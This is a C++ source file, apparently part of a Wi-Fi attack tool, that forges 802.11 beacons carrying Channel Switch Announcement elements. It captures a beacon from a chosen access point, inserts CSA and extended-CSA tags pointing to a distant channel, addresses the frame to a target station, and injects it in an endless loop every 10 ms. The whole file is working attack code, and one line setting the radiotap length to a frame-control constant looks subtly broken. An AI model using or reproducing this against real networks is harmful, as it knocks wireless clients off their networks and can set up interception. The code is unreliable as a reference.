#include "pch.h"
#include "radiotap.h"
#include "csa.h"

CsaPkt::CsaPkt(pcap_t* pcap, const Mac& apMac, const Mac& stMac)
    : pcap_(pcap), apMac_(apMac), stMac_(stMac), curCh_(0) {}

uint8_t CsaPkt::pickTargetChannel(uint8_t curCh) {
    if (curCh <= 14)    // 2.4 GHz
        return (curCh <= 6) ? 13 : 1;
    if (curCh <= 100)   // 5 GHz Low (36~64)
        return 165;
    return 36;          // 5 GHz high (100~165)
}

std::vector<uint8_t> CsaPkt::buildTagsWithCsa(const uint8_t* tagsStart, const uint8_t* tagsEnd, uint8_t targetCh) {
    Dot11BeaconHdr::Dot11Csa csa;
    csa.fill(targetCh);

    Dot11BeaconHdr::Dot11ExtCsa extCsa;
    extCsa.fill(targetCh, 0);

    std::vector<uint8_t> tags;
    bool csaInserted = false;
    bool extCsaInserted = false;

    PDot11Tag tag = (PDot11Tag)tagsStart;
    while (tag->isValid(tagsEnd)) {
        if (tag->num_ == TP_CSA) {
            tags.insert(tags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
            csaInserted = true;
            tag = tag->next();
            continue;
        }
        if (tag->num_ == TP_EXT_CSA) {
            tags.insert(tags.end(), (uint8_t*)&extCsa, (uint8_t*)&extCsa + sizeof(extCsa));
            extCsaInserted = true;
            tag = tag->next();
            continue;
        }
        if (!csaInserted && tag->num_ > TP_CSA) {
            tags.insert(tags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
            csaInserted = true;
        }
        if (!extCsaInserted && tag->num_ > TP_CSA) {
            tags.insert(tags.end(), (uint8_t*)&extCsa, (uint8_t*)&extCsa + sizeof(extCsa));
            extCsaInserted = true;
        }
        size_t tagSize = sizeof(Dot11BeaconHdr::Tag) + tag->len_;
        tags.insert(tags.end(), (uint8_t*)tag, (uint8_t*)tag + tagSize);
        tag = tag->next();
    }

    if (!csaInserted)
        tags.insert(tags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
    if (!extCsaInserted)
        tags.insert(tags.end(), (uint8_t*)&extCsa, (uint8_t*)&extCsa + sizeof(extCsa));

    return tags;
}

std::vector<uint8_t> CsaPkt::buildModifiedBeacon(const uint8_t* pkt, uint32_t capLen, uint8_t targetCh) {
    // create minimal rt header
    PRadioTapHdr newRt = (PRadioTapHdr)pkt;
    newRt->version_ = 0;
    newRt->pad_ = 0;
    newRt->len_ = FC_BEACON;

    PDot11BeaconHdr beacon = (PDot11BeaconHdr)(pkt + newRt->len_);

    const uint8_t* tagsStart = (const uint8_t*)(beacon + 1);
    const uint8_t* tagsEnd = pkt + capLen;
    if (((RadioTapHdr*)pkt)->has_fcs()) tagsEnd -= 4;

    std::vector<uint8_t> tags = buildTagsWithCsa(tagsStart, tagsEnd, targetCh);

    std::vector<uint8_t> newPkt(pkt, pkt + newRt->len_ + sizeof(Dot11BeaconHdr));
    PDot11BeaconHdr newBeacon = (PDot11BeaconHdr)(newPkt.data() + newRt->len_);
    newBeacon->addr1_ = stMac_;     // addr1 : receiverAddress

    newPkt.insert(newPkt.end(), tags.begin(), tags.end());
    return newPkt;
}

std::vector<uint8_t> CsaPkt::processBeacon(const uint8_t* pkt, uint32_t capLen) {
    if (capLen < sizeof(RadioTapHdr)) return {};
    PRadioTapHdr rthdr = (PRadioTapHdr)pkt;
    uint16_t rtLen = rthdr->get_len();

    if (capLen < rtLen + sizeof(Dot11BeaconHdr)) return {};
    PDot11BeaconHdr beacon = (PDot11BeaconHdr)(pkt + rtLen);

    if (!beacon->isBeacon()) return {};
    if (beacon->addr2_ != apMac_) return {};

    const u_char* end = pkt + capLen;
    if (rthdr->has_fcs()) end -= 4;

    uint8_t csaNewCh = 0;
    for (PDot11Tag tag = beacon->firstTag(); tag->isValid(end); tag = tag->next()) {
        if (tag->num_ == TP_DS_PARAM && tag->len_ >= 1)
            curCh_ = tag->value()[0];
        if (tag->num_ == TP_CSA && tag->len_ >= 3)
            csaNewCh = ((PDot11Csa)tag)->ch_;
    }
    if (curCh_ == 0) return {};

    uint8_t base = (csaNewCh != 0) ? csaNewCh : curCh_;
    lastTargetch_ = pickTargetChannel(base);
    return buildModifiedBeacon(pkt, capLen, lastTargetch_);
}

void CsaPkt::attack() {
    printf("Waiting for beacon from %s...\n", apMac_.toString().c_str());

    int cnt = 0;
    while (true) {  // capture a valid beacon
        struct pcap_pkthdr* hdr;
        const u_char* raw;
        int res = pcap_next_ex(pcap_, &hdr, &raw);
        if (res == 0) continue;
        if (res < 0) break;

        std::vector<uint8_t> newPkt = processBeacon(raw, hdr->caplen);
        if (newPkt.empty()) continue;

        printf("Switch channel: %u -> %u, target: %s\n", curCh_, lastTargetch_, stMac_.toString().c_str());
        while (true) {  // inject csa packet
            if (pcap_inject(pcap_, newPkt.data(), newPkt.size()) < 0) {
                fprintf(stderr, "pcap_inject failed: %s\n", pcap_geterr(pcap_));
                break;
            }
            printf("[%d] CSA beacon sent\n", ++cnt);
            usleep(10000);
        }
        
    }
}
